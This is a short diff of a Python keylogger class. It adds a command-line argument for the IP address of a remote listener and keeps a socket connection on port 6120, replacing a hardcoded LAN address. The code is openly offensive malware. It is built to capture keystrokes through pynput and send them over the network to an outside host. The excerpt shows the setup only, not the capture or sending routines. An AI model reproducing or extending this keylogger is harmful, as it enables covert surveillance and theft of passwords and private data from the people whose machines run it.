@@ -1,14 +1,16 @@
 import pynput.keyboard 
 import threading
 import socket
+import sys
 
 class Keylogger:
 
 	def __init__(self, time_interval):
+		self.target_ip = sys.argv[1]
 		self.s = socket.socket()
 		#self.ip = socket.gethostbyname(socket.gethostname())
 		self.port = 6120
-		self.s.connect(("192.168.1.151", self.port))
+		self.s.connect((self.target_ip, self.port))
 		self.log = "Keylogger started\n"
 		self.time_interval = time_interval
 
